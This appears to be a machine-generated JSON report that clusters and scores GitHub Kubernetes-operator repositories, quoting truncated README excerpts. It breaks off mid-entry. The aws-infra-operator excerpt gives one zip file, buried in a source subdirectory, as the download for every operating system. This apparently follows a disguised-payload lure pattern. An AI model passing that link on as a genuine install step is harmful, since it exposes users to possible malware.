@@ -1,0 +1,893 @@
+{
+  "run_id": "2026-04-25T22-41-43-994Z",
+  "problem": "kubernetes-operator-for-batch-ml-training-jobs",
+  "project": "cross-domain-test",
+  "generated_at": "2026-04-25T22:41:44.006Z",
+  "problem_derived": {
+    "query_seeds": [
+      "kubernetes operator",
+      "kubebuilder",
+      "batch job scheduling",
+      "gpu scheduler",
+      "ml training operator",
+      "custom resource definition",
+      "controller runtime",
+      "spot instance handling",
+      "pod disruption budget"
+    ],
+    "approach_signature": [
+      "custom-resource-definition",
+      "controller-pattern",
+      "node-affinity",
+      "gpu-scheduling",
+      "spot-preemption",
+      "checkpoint-persistence"
+    ],
+    "tech_tags": [
+      "kubernetes",
+      "k8s",
+      "golang",
+      "kubebuilder",
+      "operator-sdk",
+      "controller-runtime",
+      "helm",
+      "gpu",
+      "cuda",
+      "go"
+    ],
+    "constraint_tags": [
+      "opensource",
+      "apache-or-mit",
+      "multi-cloud"
+    ]
+  },
+  "clusters": [
+    {
+      "key": "provenance|kubebuilder",
+      "label": "kubebuilder+controller+k8s-sig-api-machinery",
+      "pattern_family": "kubebuilder",
+      "main_layer": "problem_lens",
+      "relation": "divergent",
+      "signature_contrast": [
+        "kubebuilder",
+        "query:kubebuilder",
+        "controller"
+      ],
+      "has_suggested_members": false,
+      "member_ids": [
+        "https://github.com/GeiserX/redis-operator",
+        "https://github.com/int128/argocd-commenter",
+        "https://github.com/int128/kubebuilder-updates",
+        "https://github.com/int128/ktunnels",
+        "https://github.com/be0x74a/projection",
+        "https://github.com/alperencelik/kube-external-watcher",
+        "https://github.com/kubernetes-sigs/controller-runtime",
+        "https://github.com/h0tbird/k-swarm",
+        "https://github.com/telekom/controlplane"
+      ]
+    },
+    {
+      "key": "provenance|kubernetes-operator",
+      "label": "kubernetes-operator+helm+kubebuilder",
+      "pattern_family": "kubernetes operator",
+      "main_layer": "problem_lens",
+      "relation": "divergent",
+      "signature_contrast": [
+        "query:kubernetes-operator",
+        "operator",
+        "helm"
+      ],
+      "has_suggested_members": false,
+      "member_ids": [
+        "https://github.com/k-krew/omen",
+        "https://github.com/4assin/aws-infra-operator",
+        "https://github.com/SlashNephy/mackerel-operator"
+      ]
+    },
+    {
+      "key": "framework|unknown",
+      "label": "framework+describe+inference",
+      "pattern_family": "framework",
+      "main_layer": "unknown",
+      "relation": "divergent",
+      "signature_contrast": [
+        "describe",
+        "framework",
+        "inference"
+      ],
+      "has_suggested_members": false,
+      "member_ids": [
+        "https://github.com/dixudx/yacht",
+        "https://github.com/run-ai/karta"
+      ]
+    },
+    {
+      "key": "orchestrator|unknown",
+      "label": "orchestrator+creation+monitoring",
+      "pattern_family": "orchestrator",
+      "main_layer": "unknown",
+      "relation": "divergent",
+      "signature_contrast": [
+        "monitoring",
+        "creation",
+        "custom"
+      ],
+      "has_suggested_members": false,
+      "member_ids": [
+        "https://github.com/venkateswarluvajrala/MLpad",
+        "https://github.com/tttinhtech-hash/devops-project-iac"
+      ]
+    }
+  ],
+  "outliers": [
+    "https://github.com/suhasramanand/llm-inference-operator",
+    "https://github.com/lrdinsu/workron",
+    "https://github.com/CartierSeps/octopus-parallel",
+    "https://github.com/mikkeloscar/pdb-controller"
+  ],
+  "relation_counts": {
+    "near_current_approach": 0,
+    "adjacent": 0,
+    "divergent": 4
+  },
+  "landscape_signal": "ok",
+  "axis_view": {
+    "axes": [
+      {
+        "label": "scheduler_strategy: gang-scheduling ↔ priority-class ↔ topology-aware",
+        "members": [],
+        "status": "axis_not_found_in_landscape"
+      },
+      {
+        "label": "checkpoint_layer: pvc-based ↔ object-store ↔ in-memory",
+        "members": [],
+        "status": "axis_not_found_in_landscape"
+      },
+      {
+        "label": "cost_model: spot-only ↔ mixed-pool ↔ preemption-tolerant",
+        "members": [],
+        "status": "axis_not_found_in_landscape"
+      }
+    ],
+    "unmatched": [
+      {
+        "id": "https://github.com/GeiserX/redis-operator",
+        "url": "https://github.com/GeiserX/redis-operator",
+        "owner": "GeiserX",
+        "name": "redis-operator",
+        "description": "Redis Operator for Kubernetes",
+        "language": "Go",
+        "topics": [
+          "cloud-native",
+          "container-orchestration",
+          "containers",
+          "controller",
+          "crd",
+          "custom-resource",
+          "database",
+          "devops",
+          "go",
+          "golang",
+          "infrastructure",
+          "k8s",
+          "kubebuilder",
+          "kubernetes",
+          "kubernetes-operator",
+          "nosql",
+          "operator",
+          "operator-sdk",
+          "redis",
+          "sre"
+        ],
+        "readme": "<p align=\"center\">\n  <img src=\"docs/images/banner.svg\" alt=\"Redis Operator banner\" width=\"900\"/>\n</p>\n\n<h1 align=\"center\">Redis Operator</h1>\n\n<p align=\"center\">\n  <a href=\"https://codecov.io/gh/GeiserX/redis-operator\"><img src=\"https://codecov.io/gh/GeiserX/redis-operator/graph/badge.svg\" alt=\"codecov\"/></a>\n</p>\n\n<p align=\"center\">\n  Redis Operator for Kubernetes (Proof-of-Concept).\n</p>\n\n---\n\nA lightweight Kubernetes Operator that manages single-node Redis instances defined through a Custom Resource (CR).\n\nFeatures\n\nAutomated, **immutable, secure password** generation stored in a Secret\nDeclarative **CPU / memory requests & limits**\nSimple **scaling** through spec.replicas\n**Health watch** -- emits a Warning event on the Redis CR when a Pod restarts\n  three or more times\nAutomatic **clean-up** via OwnerReferences (Deployments, Pods and Secret are\n  removed when the CR is deleted)\n\nQuick Start\n\nPrerequisites: a working kubectl context, kubectl apply permissions and Kubernetes between v1.26 and v1.33 (included).\n\n1) Install CRDs and Operator in your Kubernetes Cluster:\n\n**Option A** - apply published manifest (no clone required):\n \n\n**Option B** - build & deploy from source:\n \n\nOr use my prebuild image (latest always available too):\n \n\n**In any case***: Verify that the controller manager pod is running:\n \n\n2) Deploy a Redis instance (Example Redis CR):\n\nCreate a file redis-cr.yaml with the following contents, as an example:\n\n \n\nAnd then apply:\n \n\nChecks\n\nCheck the status of the Redis instance\n\nConfirm that Redis is up (if name and namespace are as default):\n\n \n\nCheck the p...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.03333333333333333,
+        "score": 0.2833333333333333,
+        "pattern_family": "orchestrator",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/int128/argocd-commenter",
+        "url": "https://github.com/int128/argocd-commenter",
+        "owner": "int128",
+        "name": "argocd-commenter",
+        "description": "Notify ArgoCD Application status via Pull Request comment or GitHub Deployment API",
+        "language": "Go",
+        "topics": [
+          "argocd",
+          "golang",
+          "kubebuilder",
+          "kubernetes"
+        ],
+        "readme": "argocd-commenter  \n\nThis is a Kubernetes Controller to notify a change of Argo CD Application status.\n\nExample: Pull Request notification\n\nIn the GitOps way, you merge a pull request to deploy a change to Kubernetes cluster.\nargocd-commenter allows you to receive a notification comment after merging.\n\nWhen an Application is syncing, synced or healthy, argocd-commenter will create a comment.\n\n<img width=\"900\" alt=\"image\" src=\"https://github.com/int128/argocd-commenter/assets/321266/f94d45fe-905f-461c-9c4c-8d7a8f7978bf\">\n\nWhen the sync was failed, argocd-commenter will create a comment.\n\n<img width=\"900\" alt=\"image\" src=\"https://github.com/int128/argocd-commenter/assets/321266/a442bbe8-cb79-4c7e-95b7-cbe5eae7a44d\">\n\nSee the examples in e2e-test fixtures.\n\nSequence diagram\n\nHere is the sequence diagram of the deployment flow.\n\n \n\nExample: GitHub Deployment notification\n\nIn a complex deployment flow, you can receive a notification using GitHub Deployments API.\nFor example, when you deploy a preview environment for a pull request, you can receive the deployment statuses.\n\nTo receive a deployment status, set the following annotation to the Argo CD Application:\n\n \n\nHere is an example of workflow to deploy a preview environment:\n\n \n\nWhen the Application status is changed, argocd-commenter will create a deployment status.\n\n \n\nSee the e2e test for details.\n\nSequence diagram\n\nHere is the sequence diagram of the deployment flow.\n\n \n\nGetting Started\n\nPrerequisite\n\nArgo CD is running in your Kubernetes cluster.\n\nSetup\n\nTo deploy the manifest:\n\n \n\nYou need to create either Personal Access...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.05263157894736842,
+        "score": 0.20263157894736844
+      },
+      {
+        "id": "https://github.com/int128/kubebuilder-updates",
+        "url": "https://github.com/int128/kubebuilder-updates",
+        "owner": "int128",
+        "name": "kubebuilder-updates",
+        "description": "Scaffold kubebuilder project automatically generated by GitHub Actions",
+        "language": "Go",
+        "topics": [
+          "golang",
+          "kubebuilder",
+          "kubernetes",
+          "kubernetes-controller"
+        ],
+        "readme": "kubebuilder-updates  \n\nThis is a project generated with Kubebuilder.\nIt is automatically updated by Renovate and GitHub Actions.\n\nYou can update your Kubebuilder project using the patches of this repository.\n\nHow to update your project\n\nFind the current version from cliVersion field in PROJECT file.\nCheck the CHANGELOG for the latest version and the corresponding patch.\nApply the patch to your project.",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.05,
+        "score": 0.2,
+        "pattern_family": "framework",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/int128/ktunnels",
+        "url": "https://github.com/int128/ktunnels",
+        "owner": "int128",
+        "name": "ktunnels",
+        "description": "Kubernetes controller for port-forwarding from your machine to remote hosts via Envoy TCP proxy",
+        "language": "Go",
+        "topics": [
+          "controller",
+          "golang",
+          "kubebuilder",
+          "kubernetes"
+        ],
+        "readme": "ktunnels  \n\nThis is a Kubernetes controller to set up an Envoy Proxy for port-forwarding from your computer to remote hosts.\n\nPurpose\n\nFor local development, it is nice to develop an application using a real database.\nIf a database is running in a **private network** and outside a cluster, such as Amazon RDS or Azure Database, it is **unreachable** from your computer.\n\nThis allows you to connect from your computer to a host outside a cluster.\nYou just run kubectl port-forward and set up your application to connect to localhost.\n\n \n\nThis solution is an alternative of SSH or SOCKS bastion.\nYou no longer maintain your bastion servers.\n\nGetting Started\n\nFor administrator\n\nDeploy the controller.\n\n \n\nFor user\n\nCreate a Proxy resource and Tunnel resource.\n\n \n\n \n\nRun port-forward on your computer.\n\n \n\nYou can connect to the database via localhost:5432.\n\nHow it works\n\nThis controller sets up a set of Deployment and ConfigMap for each proxy.\n\n \n\nIt also sets up a Service for each tunnel.\n\n \n\nContributions\n\nThis is an open source software licensed under Apache License 2.0.\nFeel free to open issues and pull requests for improving code and documents.",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.047619047619047616,
+        "score": 0.19761904761904764
+      },
+      {
+        "id": "https://github.com/be0x74a/projection",
+        "url": "https://github.com/be0x74a/projection",
+        "owner": "be0x74a",
+        "name": "projection",
+        "description": "The Kubernetes CRD for declarative resource mirroring across namespaces — any Kind, conflict-safe, watch-driven.",
+        "language": "Go",
+        "topics": [
+          "configmap",
+          "crd",
+          "golang",
+          "kubebuilder",
+          "kubernetes",
+          "kubernetes-controller",
+          "kubernetes-operator",
+          "mirror",
+          "reflector",
+          "secret"
+        ],
+        "readme": "projection\n\n> The Kubernetes CRD for declarative resource mirroring across namespaces — any Kind, conflict-safe, watch-driven.\n\n \n \n \n \n \n \n \n \n\nprojection is a Kubernetes operator that mirrors any Kubernetes object — ConfigMap, Secret, Service, your custom resources — from a source location to a destination, declaratively, per resource. Each Projection CR is its own first-class object with status conditions, events, and a metric you can alert on. Edits to the source propagate to the destination in roughly **100 milliseconds**.\n\nIt exists because every team eventually rebuilds this with a one-off controller or a Kyverno generate policy, and neither approach is the right shape. projection is meant to be the answer when somebody asks \"how do you mirror a Secret across namespaces in this cluster?\"\n\nWhy projection\n\n|  | projection | [emberstack/Reflector] | Kyverno [generate] |\n|---|---|---|---|\n| Works on **any Kind** | ✓ | ConfigMap & Secret only | ✓ |\n| Source-of-truth lives **in a CR you can kubectl get** | ✓ (Projection) | ✗ (annotations on the source) | ✗ (cluster-wide policy) |\n| **Per-resource status** + Kubernetes Events | ✓ | partial | ✗ |\n| **Conflict-safe** (refuses to overwrite unowned objects) | ✓ | ✗ | ✗ |\n| **Watch-driven** propagation (~100ms) | ✓ | ✓ | ✓ |\n| **Admission-time validation** of source fields | ✓ | n/a | ✓ |\n| **Prometheus metrics** per reconcile outcome | ✓ | partial | ✓ |\n| Footprint | one CRD, one Deployment | one CRD, one Deployment | full policy engine |\n\n[emberstack/Reflector]: https://github.com/emberstack/kubernetes-reflector\n[generate]: ht...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.03571428571428571,
+        "score": 0.18571428571428572
+      },
+      {
+        "id": "https://github.com/alperencelik/kube-external-watcher",
+        "url": "https://github.com/alperencelik/kube-external-watcher",
+        "owner": "alperencelik",
+        "name": "kube-external-watcher",
+        "description": "kube-external-watcher is a proposal for a reference watcher implementation for those managing external resources with Kubernetes operators.",
+        "language": "Go",
+        "topics": [
+          "controller-runtime",
+          "k8s-sig-api-machinery",
+          "kubebuilder",
+          "kubernetes"
+        ],
+        "readme": "kube-external-watcher\n\nA Go library for Kubernetes operators that manage external resources (cloud APIs, hypervisors, etc.) — replaces reconcile.RequeueAfter polling with drift-triggered reconciliation.\n\nFor the motivation and design rationale, see the write-up: **The missing piece of Kubernetes operators**.\n\nTL;DR\n\nOperators managing external resources can't rely on Kubernetes events alone — out-of-band changes (console edits, other controllers, drift) go undetected. The usual workaround is reconcile.RequeueAfter on a fixed cadence, which reconciles whether or not anything changed.\n\nkube-external-watcher runs alongside your controllers, polls the external API, and triggers reconciliation **only when drift is detected**:\n\nRuns as a manager.Runnable (leader-elected, one replica polls).\nPer-resource goroutines.\nYou implement ResourceStateFetcher + optional StateComparator.\nDrift → GenericEvent → reconcile. No drift → nothing.\n\nGetting started\n\n**Example implementation** — end-to-end integration pattern.\n**Architecture** — interfaces, lifecycle, auto-register.\n\nAdopters\n\nProjects using kube-external-watcher in the wild:\n\n**kubemox** — a Kubernetes operator for Proxmox VE that helps you to create Proxmox resources with Custom Resources and detects out-of-band changes via this library.\n\nUsing it in your project? Open a PR to add yourself here.",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.03571428571428571,
+        "score": 0.18571428571428572
+      },
+      {
+        "id": "https://github.com/kubernetes-sigs/controller-runtime",
+        "url": "https://github.com/kubernetes-sigs/controller-runtime",
+        "owner": "kubernetes-sigs",
+        "name": "controller-runtime",
+        "description": "Repo for the controller-runtime subproject of kubebuilder (sig-apimachinery)",
+        "language": "Go",
+        "topics": [
+          "k8s-sig-api-machinery"
+        ],
+        "readme": "Kubernetes controller-runtime Project\n\nThe Kubernetes controller-runtime Project is a set of go libraries for building\nControllers. It is leveraged by Kubebuilder and\nOperator SDK. Both are\na great place to start for new projects. See\nKubebuilder's Quick Start to\nsee how it can be used.\n\nDocumentation:\n\nPackage overview\nBasic controller using builder\nCreating a manager\nCreating a controller\nExamples\nDesigns\n\nVersioning, Maintenance, and Compatibility\n\nThe full documentation can be found at VERSIONING.md, but TL;DR:\n\nUsers:\n\nWe stick to a zero major version\nWe publish a minor version for each Kubernetes minor release and allow breaking changes between minor versions\nWe publish patch versions as needed and we don't allow breaking changes in them\n\nContributors:\n\nAll code PR must be labeled with :bug: (patch fixes), :sparkles: (backwards-compatible features), or :warning: (breaking changes)\nBreaking changes will find their way into the next major release, other changes will go into an semi-immediate patch or minor release\nFor a quick PR template suggesting the right information, use one of these PR templates:\n  * Breaking Changes/Features\n  * Backwards-Compatible Features\n  * Bug fixes\n  * Documentation Changes\n  * Test/Build/Other Changes\n\nCompatibility\n\nEvery minor version of controller-runtime has been tested with a specific minor version of client-go. A controller-runtime minor version *may* be compatible with\nother client-go minor versions, but this is by chance and neither supported nor tested. In general, we create one minor version of controller-runtime\nfor each minor v...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder",
+          "controller runtime"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.03333333333333333,
+        "score": 0.18333333333333335,
+        "pattern_family": "classifier",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/h0tbird/k-swarm",
+        "url": "https://github.com/h0tbird/k-swarm",
+        "owner": "h0tbird",
+        "name": "k-swarm",
+        "description": "A k8s service swarm",
+        "language": "Go",
+        "topics": [
+          "cli",
+          "kubebuilder",
+          "kubernetes"
+        ],
+        "readme": "k-swarm\nk-swarm is used for deploying a series of k8s services that are capable of identifying and communicating with one another, thus establishing a network of synthetic traffic. This interconnected traffic among various workloads provides a foundational platform for a range of laboratory experiments, including the testing and validation of diverse service mesh configurations at scale.\n\nInstall\n\n \n\nUsage\n\nInstall the informer with two replicas to all kind clusters (the\n--dataplane-mode flag is required on every informer and worker\ninvocation):\n \n\nInstall services 1 to 5 with 2 workers each to all kind clusters:\n \n\nEnable telemetry for service-1 on all kind clusters:\n \n\nRender manifests to stdout without applying them (handy for kubectl diff\nor reviewing template output):\n \n\nExpose service 1 via a per-namespace Gateway API Gateway/HTTPRoute:\n \n\nEnable cross-cluster failover for ambient-mode workers (labels the peer\nand waypoint Services with istio.io/global=true and emits a\nDestinationRule with locality failover by topology.istio.io/cluster):\n \n\nDeveloping\n\nDownload all the Makefile tooling to ./bin/:\n \n\nBring up a local dev environment:\n \n\nCreate a new release:\n \n\nUpgrade kubebuilder\n \n\nPerformance Profiling and Benchmarking\nCPU Profiling\n \n\nMemory Profiling\n \n\nTracing\n \n\nBenchmarking",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.07692307692307693,
+        "score": 0.17692307692307693,
+        "pattern_family": "cli_tool",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/telekom/controlplane",
+        "url": "https://github.com/telekom/controlplane",
+        "owner": "telekom",
+        "name": "controlplane",
+        "description": "⚠️ Disclaimer: This is a beta version!",
+        "language": "Go",
+        "topics": [
+          "api-management",
+          "controlplane",
+          "kubebuilder",
+          "kubernetes"
+        ],
+        "readme": "<!--\nSPDX-FileCopyrightText: 2025 Deutsche Telekom AG\n\nSPDX-License-Identifier: CC0-1.0    \n-->\n\n<p align=\"center\">\n  <img src=\"docs/static/img/eni-tardis.svg\" alt=\"Open Telekom Integration Platform logo\" width=\"200\">\n  <h1 align=\"center\">Control Plane</h1>\n</p>\n\n<p align=\"center\">\n  A cloud-agnostic orchestration platform for self-service API management across multi-cloud environments.\n</p>\n\n---\n\nAs part of the Open Telekom Integration Platform, the Control Plane enables platform engineers and application teams to manage APIs, configure approval workflows, and mesh services across cloud boundaries — all from a single, unified interface.\n\n📖 **Read the full documentation**\n\nCode of Conduct\n\nThis project has adopted the Contributor Covenant in version 2.1 as our code of conduct. Please see the details in our CODE_OF_CONDUCT.md. All contributors must abide by the code of conduct.\n\nLicensing\n\nThis project follows the REUSE standard for software licensing.    \nEach file contains copyright and license information, and license texts can be found in the ./LICENSES folder. For more information visit https://reuse.software/.    \nYou can find a guide for developers at https://telekom.github.io/reuse-template/.",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.06666666666666667,
+        "score": 0.16666666666666669,
+        "pattern_family": "orchestrator",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/k-krew/omen",
+        "url": "https://github.com/k-krew/omen",
+        "owner": "k-krew",
+        "name": "omen",
+        "description": "A lightweight, declarative chaos engineering operator for Kubernetes",
+        "language": "Go",
+        "topics": [
+          "chaos-engineering",
+          "chaos-testing",
+          "controller-runtime",
+          "fault-injection",
+          "golang",
+          "helm-chart",
+          "kubebuilder",
+          "kubernetes",
+          "kubernetes-operator",
+          "reliability",
+          "sre"
+        ],
+        "readme": "Omen\n\nA lightweight Kubernetes chaos engineering operator with transparent target selection and optional manual approval.\n\nOverview\n\nOmen lets you declaratively define chaos experiments against your workloads. Each run:\n\nSelects a fixed set of target pods (preview)\nOptionally waits for manual approval\nExecutes the chaos action against those exact targets\nRecords per-target results and a summary\n\nTwo CRDs are provided:\n\n**Experiment** — defines the schedule, target selector, action, safety limits, and approval policy\n**ExperimentRun** — a single execution instance created by the controller, holding the target preview, approval state, and results\n\nRoadmap\n\nCurious about what's coming next? Check out our Roadmap to see our plans for advanced target filtering, ChatOps integrations, and more!\n\nBreaking Changes in v0.3.0\n\nVersion 0.3.0 introduces a major architectural shift to an **opt-in sidecar model** for network chaos, replacing the old ephemeral containers approach.\n\n**Namespace Opt-in Required:** You must explicitly label target namespaces with chaos.kreicer.dev/enabled=true.\n**Sidecar Injection:** A mutating webhook now automatically injects the omen-agent sidecar into pods in enabled namespaces.\n**Removed Flags:** The ProtectedNamespaces CLI flag and Helm value have been completely removed in favor of the new opt-in label system.\n\nInstall via Helm\n\n \n\nTo customise the installation:\n\n \n\nController flags\n\n| Flag | Default | Description |\n|---|---|---|\n| --webhook-timeout | 10s | Timeout for outgoing approval webhook HTTP requests. |\n| --leader-elect | false | Enable leader...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubernetes operator",
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.03225806451612903,
+        "score": 0.23225806451612904
+      },
+      {
+        "id": "https://github.com/4assin/aws-infra-operator",
+        "url": "https://github.com/4assin/aws-infra-operator",
+        "owner": "4assin",
+        "name": "aws-infra-operator",
+        "description": "🌐 Manage AWS infrastructure effortlessly with Kubernetes or CLI using declarative YAML for streamlined deployments and easy resource control.",
+        "language": "Go",
+        "topics": [
+          "aws",
+          "cicd",
+          "cli",
+          "cloud-native",
+          "containers",
+          "deployment",
+          "devops",
+          "fhir",
+          "gitops",
+          "go",
+          "helm",
+          "infrastructure",
+          "infrastructure-as-code",
+          "k8s-operator",
+          "kodjin",
+          "kubebuilder",
+          "kubernetes",
+          "operator",
+          "rmk",
+          "terraform-alternative"
+        ],
+        "readme": "🚀 aws-infra-operator - Easily Manage AWS Infrastructure\n\n📥 Download Now\n\n \n\n📋 Description\n\nThe aws-infra-operator is a production-ready tool designed to help you manage AWS infrastructure resources. You can run it either as a Kubernetes controller or as a standalone command-line interface (CLI). With this tool, you gain the ability to automate and streamline your cloud operations, enhancing efficiency and reliability.\n\n🚀 Getting Started\n\nFollow these simple steps to get started with the aws-infra-operator:\n\n**Check System Requirements:**  \n   Ensure your system meets the following requirements:\n   - Operating System: Windows, macOS, or Linux.\n   - A minimum of 1 GB RAM.\n   - An internet connection for downloading and using the tool.\n\n**Visit the Releases Page:**  \n   To download the latest version of aws-infra-operator, visit the Releases page. Here, you will find the available versions of the software.\n\n📥 Download & Install\n\n**Select the Latest Release:**  \n   On the Releases page, look for the latest version. It is usually marked as \"Latest release.\" Click on this version to view more details.\n\n**Download the Appropriate File:**  \n   Depending on your operating system, choose the file that suits your needs. You will generally see options like:\n   - Windows (e.g., https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip)\n   - macOS (e.g., https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip)\n   - Linux (e.g., https://raw.githubuserc...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubernetes operator",
+          "kubebuilder"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0.03225806451612903,
+        "score": 0.18225806451612905,
+        "pattern_family": "cli_tool",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/SlashNephy/mackerel-operator",
+        "url": "https://github.com/SlashNephy/mackerel-operator",
+        "owner": "SlashNephy",
+        "name": "mackerel-operator",
+        "description": "A Kubernetes operator that synchronizes ExternalMonitor resources with Mackerel external monitors.",
+        "language": "Go",
+        "topics": [
+          "crd",
+          "golang",
+          "helm",
+          "kubernetes",
+          "mackerel",
+          "monitoring",
+          "operator"
+        ],
+        "readme": "mackerel-operator\n\nmackerel-operator synchronizes Kubernetes ExternalMonitor resources with Mackerel external URL monitors.\n\nMVP Scope\n\nManages Mackerel HTTP/HTTPS external monitors.\nWatches namespaced ExternalMonitor resources across the cluster.\nReads the Mackerel API key from MACKEREL_APIKEY.\nSupports --policy=upsert-only and --policy=sync.\nStores ownership metadata in the Mackerel monitor memo:\n\n \n\nExample\n\n \n\nDevelopment\n\n \n\nRunning Locally\n\n \n\nInstalling With Helm\n\nOnce GitHub Pages publishing is enabled, add the chart repository:\n\n \n\nCreate a Secret that contains the Mackerel API key:\n\n \n\nInstall the chart:\n\n \n\nThe chart installs the ExternalMonitor CRD from charts/mackerel-operator/crds/.\nThe release workflow publishes ghcr.io/slashnephy/mackerel-operator:<chart version>\nand ghcr.io/slashnephy/mackerel-operator:latest to GHCR.\n\nPublishing Helm Chart With GitHub Pages\n\nThis repository includes .github/workflows/release-chart.yml, which uses\nhelm/chart-releaser-action to publish charts/mackerel-operator as a Helm\nrepository on GitHub Pages and also copies README.md to the published\nindex.md.\n\nOne-time repository setup on GitHub:\n\nCreate and push an empty gh-pages branch.\nOpen repository Settings > Pages.\nSet the publishing source to the gh-pages branch and the / (root) folder.\n\nAfter that, every push to main runs the chart release workflow. When\ncharts/mackerel-operator/Chart.yaml version changes, the workflow packages the\nchart, creates or updates the GitHub Release, refreshes the Pages index, and\nupdates the top page by syncing README.md to index.md.\n\nDeletion Polic...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "kubernetes operator"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.15000000000000002,
+        "pattern_family": "orchestrator",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/dixudx/yacht",
+        "url": "https://github.com/dixudx/yacht",
+        "owner": "dixudx",
+        "name": "yacht",
+        "description": "Most Light-weighted Kubernetes controller-runtime Framework",
+        "language": "Go",
+        "topics": [
+          "controller-runtime",
+          "framework",
+          "golang",
+          "kubernetes",
+          "operator"
+        ],
+        "readme": "Yacht\n\n \n \n \n \n \n \n \n\n---\n\nLight-weighted Kubernetes controller-runtime Framework with Minimal Dependencies\n\n---\n\nWhy Building Yacht\n\nWell, there are quite a few controller/operator frameworks out there, such\nas kubebuilder,\noperator-sdk,\ncontroller-runtime. But they are not quite handy.\n\nFirst of all, building a scaffold project may not be what we really need. Most of the time, we are not trying to build a\nproject from scratch, but rather adding new controllers on an existing project. Moreover, the structure of the scaffold\nproject does not suit all. It is not easy to customize the scaffolds according to our own preferences.\n\nSecondly, **backwards compatibility**. Most frameworks **DO NOT** guarantee any particular compatibility matrix between\nkubernetes library dependencies (client-go,\napimachinery, etc). This is painful when we want to pin Kubernetes library\ndependencies to any specific lower versions. It has always been a headache to upgrade/downgrade the versions of\nframeworks and Kubernetes library dependencies.\n\nLast but not least, we **DO** want a light-weighted framework with minimal dependencies.\n\nThat's why I build yacht, which brings pleasure user experiences on writing\nKubernetes controllers. It is built with minimal dependencies, which makes it easier to downgrade/upgrade module\nversions.\n\nTo Start Using Yacht\n\nAdd github.com/dixudx/yacht to your go.mod file.\nFollow yacht examples and learn how to use.",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "controller runtime"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.15000000000000002,
+        "pattern_family": "framework",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/run-ai/karta",
+        "url": "https://github.com/run-ai/karta",
+        "owner": "run-ai",
+        "name": "karta",
+        "description": "Translation layer that maps any Kubernetes framework's Custom Resource Definitions (CRDs) into a standardized, generic structure.",
+        "language": "Go",
+        "topics": [
+          "crd",
+          "inference",
+          "k8s",
+          "karta",
+          "kubernetes",
+          "training",
+          "translation"
+        ],
+        "readme": "Karta\n\n**A standard way to describe the structure of any Kubernetes workload type.**\n\nKarta lets you define a portable, declarative blueprint for any Kubernetes workload — whether it's a simple Deployment, a distributed PyTorchJob, or a custom CRD. Controllers and platforms can then use that blueprint to inspect, modify, and manage workloads without hard-coding knowledge of each type.\n\nThe Problem\n\nIn Kubernetes, and especially in AI systems, a workload is not a standalone execution unit such as a single Pod. Instead, it is composed of multiple components organized in a complex hierarchy of resources, often exposed via custom resource definitions (CRDs) — for example: PyTorchJob, RayCluster, and MPIJob. Each of these CRDs structures the workload configuration differently, but they all share the same conceptual building blocks: pod specifications, scaling parameters, and status definitions.\n\nIf you're building a controller, scheduler, or platform that needs to work with multiple workload types, you end up writing bespoke logic for each one:\n\nWhere is the pod template?\nHow do I find the replica count?\nWhich status conditions mean \"running\" vs \"failed\"?\nHow do I modify the pod spec without breaking the workload?\n\nThis doesn't scale. Every new workload type means new integration code — schedulers, controllers, and platforms all end up maintaining per-CRD adapters that implement the same patterns over and over.\n\nThe Solution\n\nKarta (*a map to navigate resources*) introduces a CRD that maps the 